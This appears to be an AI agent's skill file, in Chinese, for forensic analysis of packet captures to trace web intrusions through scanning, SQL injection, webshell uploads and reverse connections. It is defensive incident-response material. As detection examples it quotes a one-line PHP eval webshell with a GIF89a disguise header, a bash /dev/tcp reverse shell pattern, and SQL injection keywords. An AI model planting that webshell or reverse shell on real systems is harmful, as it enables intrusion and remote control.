---
name: pcap-forensics
description: 分析已有抓包文件（pcap/pcapng）做流量取证与入侵回溯：识别扫描、SQL 注入、文件上传木马、WebShell 控制、反弹外联，落地证据并出报告。触发词：流量分析、抓包分析、pcap、pcapng、wireshark、tshark、入侵取证、应急响应、webshell 流量、CTF 流量题、这个包里谁在攻击。
---

# 流量取证（PCAP / Wireshark）

分析**已经抓好的包**，回答「谁、什么时候、用什么手法、留下了什么证据」。
实时抓包不归本技能管（`dumpcap -i <网卡> -w out.pcap` 或 `tshark -i`）。

## 第 0 步：先自检工具，别急着写解析器

```bash
tshark -v            # 有 tshark 就走 A 路线
python --version     # 没有 tshark 就走 B 路线（本技能自带零依赖工具）
```

| 路线 | 条件 | 用什么 |
|---|---|---|
| A | 有 tshark / Wireshark | tshark 命令 + GUI 跟随流，见 `references/wireshark-filters.md` |
| B | 什么都没有 | `scripts/pcapkit.py`（纯标准库，pcap+pcapng，自带 TCP 重组） |

**B 路线不是降级方案，是主线之一**：离线环境、沙箱、只给一个 Python 的场景经常如此。
不要因为「没装 Wireshark」就退回手工 `struct.unpack` 逐字节调——那是重复实现本技能已有的东西。

## 第 1 步：三分钟定盘子

```bash
python scripts/pcapkit.py summary 流量.pcap
```

一次拿到：包数、时间范围、协议构成、Top 会话、UA 分布（含 404 占比）、
攻击链各阶段命中次数与首现时间、可疑非 HTTP 长连接。**这一步就能写出结论骨架。**

判读顺序：
1. **时间范围**决定后面所有结论的时间窗，先记下来（统一 UTC+8 并标注）。
2. **协议构成**：全 TCP 说明是 Web 类事件；大量 UDP/DNS 先怀疑隧道或扫描。
3. **Top 会话按字节**：找被拖库 / 被下载的那条流。
4. **UA 分布**：404 占比 ≥60% 的那个 UA 就是扫描器——UA 可伪装，行为不会。

## 第 2 步：按攻击链分段检索

阶段固定八段，按顺序查，每段拿到「首现时间 + 代表请求 + stream 号」：

| 阶段 | 检索什么 | pcapkit | tshark 等价 |
|---|---|---|---|
| 侦察扫描 | 404 率、目录字典 | `summary` 的 UA 表 | `http.response.code==404` |
| SQL 注入 | union / 报错 / 时间盲注 | `grep "union select" "extractvalue(" "sleep("` | `-Y 'http contains "union select"'` |
| 写文件拖库 | INTO OUTFILE、拖表 | `grep "into outfile" "from users"` | 同左（注意编码） |
| 后台登录 | login 接口、会话伪造 | `grep "login"` + 看 `Cookie` | `-Y 'http.request.uri contains "login"'` |
| 文件上传 | multipart、filename | `grep "multipart/form-data"` | `-Y 'http.content_type contains "multipart"'` |
| 木马本体 | `<?php`、`eval(`、`GIF89a` | `export` 的 `_upload_*.bin` | 跟随流看请求体 |
| WebShell 控制 | antSword / 冰蝎 / 哥斯拉 UA 与固定参数 | `grep "antsword" "pass="` | `-Y 'http.user_agent contains "antSword"'` |
| 命令执行外联 | 非 HTTP 长连接、反弹端口 | `summary` 末尾 + `stream <ID>` | `-Y 'ip.addr==<外网IP>'` |
| 编码载荷 | 参数里的 base64 命令 | `b64`（蚁剑/冰蝎/哥斯拉必查） | 无等价过滤器，需手工解 |

## 第 3 步：证据落地（最容易做错）

```bash
python scripts/pcapkit.py export 流量.pcap -d objects/     # 响应体 + 上传片段
python scripts/pcapkit.py b64    流量.pcap                 # 解 base64 参数，找反弹/C2 地址
python scripts/pcapkit.py stream 流量.pcap 13706           # 单条流（默认已解 gzip，可读）
python scripts/pcapkit.py stream 流量.pcap 13706 --raw     # 线上原始字节，可重定向为 .bin
python scripts/pcapkit.py http   流量.pcap --csv req.csv   # 请求全量清单
```

- **服务器返回的东西**在**响应体**里 → `export` 默认导出（已过滤 404 噪声）。
- **上传的木马**在**请求体**里 → 工具解析 multipart 后单独落成
  `*_upload_<原文件名>.bin`，`manifest.json` 里 `has_php=true` 的就是木马本体。
  典型内容：`GIF89a` 头 + `<?php eval($_POST['xxx']);?>`（改文件名/头绕检测）。
- **WebShell 执行结果**在响应体，但请求参数被编码，必须解码后看。

## 第 4 步：出报告

```bash
python scripts/pcapkit.py report 流量.pcap -d report/     # 生成 report.md
```

六段结构（模板见 `references/report-template.md`）：样本概况 / 通信画像 / 攻击链命中 /
关键事件时间线 / IOC / 下一步建议。时间线只留非 404 的代表事件、每阶段最多 5 条，
否则扫描流量会把时间线冲成几万行噪声。

## 硬规则（每条都踩过）

1. **payload 十有八九被 URL 编码**。`INTO OUTFILE` 在包里是 `INTO%20OUTFILE`，
   直接搜原文命中 0。检索必须带解码变体（`pcapkit grep` 已内置）。
2. **gzip / chunked 不解等于没抓**。`parse_http` 会按 `Content-Encoding` 解压，
   声明缺失时再按魔术字节嗅探（`1f8b` / `78 01|9c|da|5e`）；`br`/`zstd` 解不了会在
   `summary` 末尾提示，别当成「响应是空的」。遇到识别不出的二进制，用
   `stream <ID> --raw` 拿原始字节，别用截图里的乱码下结论。
3. **上传木马不在响应里**。只看响应体会得出「没上传成功」的错误结论。
4. **抓包点决定谁是"攻击者"**。容器/NAT 里源地址常是网关（如 `172.17.0.1`），
   报告要写「抓包点视角」，不要当成真实攻击来源。
5. **不要用 IP 猜方向**，用 HTTP 方向（谁发请求谁是客户端）。
6. **UA 可伪装**。签名不命中 ≠ 没扫描，看 404 占比。
7. **时间戳写清时区**。pcap 里是 UTC 秒，报告统一 UTC+8 并标注。
8. **>500MB 别用纯 Python 硬啃**，走 tshark + `--export-objects`。
9. **本工具的 stream 编号 ≠ tshark 的 tcp.stream**，报告里注明编号来源便于复核。
10. **结论要有包级证据**（stream 号、时间、原始字节），不要只给判断。
11. **Windows 上的终端防护会吃掉证据**。导出的木马可能被当场隔离，连分析脚本
    本身都可能被删（含完整一句话的文件会被判威胁）。导出目录要加排除项，
    或改在 Linux/WSL 里做；需要保真时用 `stream <ID> --raw` 存原始字节。
12. **改重组/解析逻辑后先跑 `python tests/test_pcapkit.py`**（42 个用例，自造样本，
    覆盖乱序、重传、keep-alive、gzip/chunked、编码注入），别拿真实样本赌。
13. **蚁剑/冰蝎/哥斯拉的命令在 base64 里，`grep` 永远搜不到**。HTTP 明文只有
    `fff=<一串 base64>`，反弹地址就藏在解出来的 `bash -i >& /dev/tcp/IP/PORT` 里。
    必须跑 `b64` 子命令；`summary` 末尾也会自动汇总解码出的地址。
    解码时注意 `+` 被 URL 编码成 `%2B`，先还原再解，否则 token 会从 `%` 处断裂。

## 常用扩展场景

- 只有 DNS：`-Y dns` 看子域长度与 TXT 记录，判断隧道外传。
- 加密流量：先看 SNI / 证书（`tls.handshake.extensions_server_name`），再做 JA3 聚类。
- 内网横向：`-z conv,tcp` 找对端数量异常的主机（扫描 / 爆破特征）。
- 数据外传：按 stream 字节排序，看「出方向远大于入方向」的流。

## 资源

- `scripts/pcapkit.py` — 零依赖工具，七个子命令：`summary / http / grep / stream / b64 / export / report`。
- `references/wireshark-filters.md` — Wireshark GUI 与 tshark 过滤器速查（按攻击链分好组）。
- `references/report-template.md` — 取证报告模板与结论写法示例。
